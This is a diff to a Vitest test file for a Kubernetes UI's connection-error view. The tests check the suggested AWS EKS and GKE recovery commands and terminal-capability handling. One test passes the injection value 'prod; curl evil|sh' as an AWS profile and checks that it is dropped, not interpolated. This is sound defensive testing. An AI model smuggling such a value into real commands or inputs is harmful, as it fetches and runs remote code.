@@ -1,6 +1,6 @@
 import { renderToStaticMarkup } from 'react-dom/server'
 import type { ReactNode } from 'react'
-import { describe, expect, it, vi } from 'vitest'
+import { beforeEach, describe, expect, it, vi } from 'vitest'
 import type { ContextInfo } from '../types'
 
 vi.stubGlobal('window', { location: { host: 'localhost:9280' } })
@@ -8,6 +8,7 @@ vi.stubGlobal('window', { location: { host: 'localhost:9280' } })
 const useContextsMock = vi.hoisted(() => vi.fn(
   (): { data: ContextInfo[] | undefined } => ({ data: undefined }),
 ))
+const capabilitiesMock = vi.hoisted(() => ({ localTerminal: true }))
 
 vi.mock('@skyhook-io/k8s-ui', () => ({
   ClusterName: ({ name }: { name: string }) => <span>{name}</span>,
@@ -16,6 +17,9 @@ vi.mock('@skyhook-io/k8s-ui', () => ({
 vi.mock('../api/client', () => ({
   useAuthMe: () => ({ data: { authEnabled: false } }),
   useContexts: useContextsMock,
+}))
+vi.mock('../contexts/CapabilitiesContext', () => ({
+  useCapabilitiesContext: () => capabilitiesMock,
 }))
 vi.mock('./ContextSwitcher', () => ({
   ContextSwitcher: () => <button>Switch context</button>,
@@ -41,6 +45,10 @@ function renderError(errorType: string, context: string): string {
   )
 }
 
+beforeEach(() => {
+  capabilitiesMock.localTerminal = true
+})
+
 describe('ConnectionErrorView authentication guidance', () => {
   it('builds an honest EKS diagnostic without presenting it as authentication', () => {
     const context = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
@@ -61,6 +69,36 @@ describe('ConnectionErrorView authentication guidance', () => {
     expect(hints.authCommand).toBeUndefined()
     expect(hints.hideAuthButton).toBeUndefined()
     expect(hints.fallbackCommand?.command).toBe('aws sso login')
+  })
+
+  it('pins the kubeconfig AWS profile on every EKS command that would otherwise use the ambient one', () => {
+    const context = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
+    const profile = 'myorg/prod/admin'
+
+    const rejected = getAuthRejectedHints(context, profile)
+    expect(rejected.fallbackCommand?.command).toBe('aws sso login --profile myorg/prod/admin')
+    expect(rejected.authCommand?.command).toBe(
+      'aws sts get-caller-identity --profile myorg/prod/admin && aws eks describe-cluster --name prod --region us-east-1 --profile myorg/prod/admin --query cluster.accessConfig.authenticationMode --output text',
+    )
+    expect(rejected.hints.join(' ')).not.toContain("terminal's current AWS profile")
+
+    const auth = selectConnectionHints('auth', context, undefined, profile)
+    expect(auth?.authCommand?.command).toBe('aws sso login --profile myorg/prod/admin')
+    expect(auth?.fallbackCommand?.command).toBe('aws eks update-kubeconfig --name prod --region us-east-1 --profile myorg/prod/admin')
+
+    const timeout = selectConnectionHints('timeout', context, undefined, profile)
+    expect(timeout?.authCommand?.command).toBe('aws sso login --profile myorg/prod/admin')
+    expect(timeout?.fallbackCommand?.command).toBe('aws eks update-kubeconfig --name prod --region us-east-1 --profile myorg/prod/admin')
+  })
+
+  it('drops a hostile AWS profile instead of interpolating it', () => {
+    const context = 'arn:aws:eks:us-east-1:123456789012:cluster/prod'
+    const hints = getAuthRejectedHints(context, 'prod; curl evil|sh')
+
+    expect(hints.fallbackCommand?.command).toBe('aws sso login')
+    expect(hints.authCommand?.command).toBe(
+      'aws sts get-caller-identity && aws eks describe-cluster --name prod --region us-east-1 --query cluster.accessConfig.authenticationMode --output text',
+    )
   })
 
   it('does not offer interpolated commands for hostile GKE context values', () => {
@@ -118,6 +156,18 @@ describe('ConnectionErrorView authentication guidance', () => {
     const markup = renderToStaticMarkup(<CopyableCommand command="placeholder" />)
 
     expect(markup).not.toContain('aria-label="Run command in terminal"')
+  })
+
+  it('keeps recovery commands copyable without offering an unavailable local terminal', () => {
+    capabilitiesMock.localTerminal = false
+
+    const markup = renderError('auth', 'gke_project_us-east1_prod')
+
+    expect(markup).toContain('Refresh Google Cloud credentials')
+    expect(markup).toContain('>gcloud</span>')
+    expect(markup).toContain('aria-label="Copy command to clipboard"')
+    expect(markup).not.toContain('aria-label="Run command in terminal"')
+    expect(markup).not.toContain('Authenticate in terminal')
   })
 })
 
